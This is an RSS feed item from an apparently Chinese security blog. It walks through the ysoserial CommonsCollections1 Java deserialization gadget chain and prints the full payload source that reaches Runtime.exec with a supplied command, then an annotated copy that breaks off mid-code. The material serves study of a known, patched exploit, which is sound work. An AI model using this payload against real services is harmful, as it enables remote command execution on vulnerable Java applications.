<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Milkii0的秘密花园 • Posts by &#34;java反序列化&#34; tag</title>
        <link>http://example.com</link>
        <description></description>
        <language>en</language>
        <pubDate>Tue, 07 Sep 2021 10:12:48 +0800</pubDate>
        <lastBuildDate>Tue, 07 Sep 2021 10:12:48 +0800</lastBuildDate>
        <category>CodeQL</category>
        <category>codeql, 搭建教程</category>
        <category>web,HTTP</category>
        <category>redis,未授权,漏洞利用</category>
        <category>solr, 漏洞复现</category>
        <category>solr, 代码审计</category>
        <category>前后端分离</category>
        <category>文件上传靶场</category>
        <category>Java反序列化</category>
        <category>ysoserial调试</category>
        <category>木马,汇总</category>
        <category>pikachu,web靶场</category>
        <category>dorabox,靶场练习</category>
        <category>sql注入靶场</category>
        <category>webgoat</category>
        <item>
            <guid isPermalink="true">http://example.com/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/</guid>
            <title>ysoserial之CommonsCollections1调试</title>
            <link>http://example.com/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/</link>
            <category>Java反序列化</category>
            <pubDate>Tue, 07 Sep 2021 10:12:48 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;利用链简述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用链简述&#34;&gt;#&lt;/a&gt; 利用链简述&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;任意方法执行&lt;/li&gt;
&lt;li&gt;高版本 java 已修复（Java 8u71 以后）&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;commonscollections1利用代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#commonscollections1利用代码&#34;&gt;#&lt;/a&gt; CommonsCollections1 利用代码&lt;/h1&gt;
&lt;p&gt;项目地址：&lt;a href=&#34;https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar&#34;&gt;https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	Gadget chain:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;		ObjectInputStream.readObject()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;			AnnotationInvocationHandler.readObject()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;				Map(Proxy).entrySet()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;					AnnotationInvocationHandler.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;						LazyMap.get()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;							ChainedTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								ConstantTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								InvokerTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;									Method.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;										Class.getMethod()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								InvokerTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;									Method.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;										Runtime.getRuntime()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								InvokerTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;									Method.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;										Runtime.exec()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	Requires:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;		commons-collections&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@SuppressWarnings(&amp;#123;&amp;quot;rawtypes&amp;quot;, &amp;quot;unchecked&amp;quot;&amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@PayloadTest&lt;/span&gt; ( precondition = &lt;span class=&#34;string&#34;&gt;&amp;quot;isApplicableJavaVersion&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@Dependencies(&amp;#123;&amp;quot;commons-collections:commons-collections:3.1&amp;quot;&amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@Authors(&amp;#123; Authors.FROHOFF &amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;CommonsCollections1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;PayloadRunner&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ObjectPayload&lt;/span&gt;&amp;lt;&lt;span class=&#34;title&#34;&gt;InvocationHandler&lt;/span&gt;&amp;gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; InvocationHandler &lt;span class=&#34;title&#34;&gt;getObject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String command)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String[] execArgs = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; String[] &amp;#123; command &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// inert chain for setup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer transformerChain = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ChainedTransformer(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[]&amp;#123; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// real chain for after setup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(Runtime.class),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;getMethod&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					String.class, Class[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;string&#34;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;invoke&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					Object.class, Object[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123; String.class &amp;#125;, execArgs),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map innerMap = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HashMap();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map lazyMap = LazyMap.decorate(innerMap, transformerChain);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		Reflections.setFieldValue(transformerChain, &lt;span class=&#34;string&#34;&gt;&amp;quot;iTransformers&amp;quot;&lt;/span&gt;, transformers); &lt;span class=&#34;comment&#34;&gt;// arm with actual transformer chain&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; handler;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		PayloadRunner.run(CommonsCollections1.class, args);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;isApplicableJavaVersion&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; JavaVersion.isAnnInvHUniversalMethodImpl();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;调试分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调试分析&#34;&gt;#&lt;/a&gt; 调试分析&lt;/h1&gt;
&lt;p&gt;ysoserialPOC 类中 getObject 方法一般是获取 payload 的方法&lt;/p&gt;
&lt;h2 id=&#34;分析paylaod构造&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#分析paylaod构造&#34;&gt;#&lt;/a&gt; 分析 paylaod 构造&lt;/h2&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; InvocationHandler &lt;span class=&#34;title&#34;&gt;getObject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String command)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 传入的命令参数存储于execArgs数组中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String[] execArgs = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; String[] &amp;#123; command &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 开始构造transformerChain，用于执行命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// inert chain for setup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 这一步据p神所言是为了隐藏日志中的进程日常信息， 加不加都会执行命令，只是异常信息不同&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer transformerChain = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ChainedTransformer(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[]&amp;#123; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// real chain for after setup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 通过反射获得Runtime.exec(),并将命令参数execArgs传入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(Runtime.class),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;getMethod&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					String.class, Class[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;string&#34;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;invoke&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					Object.class, Object[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[&lt;span 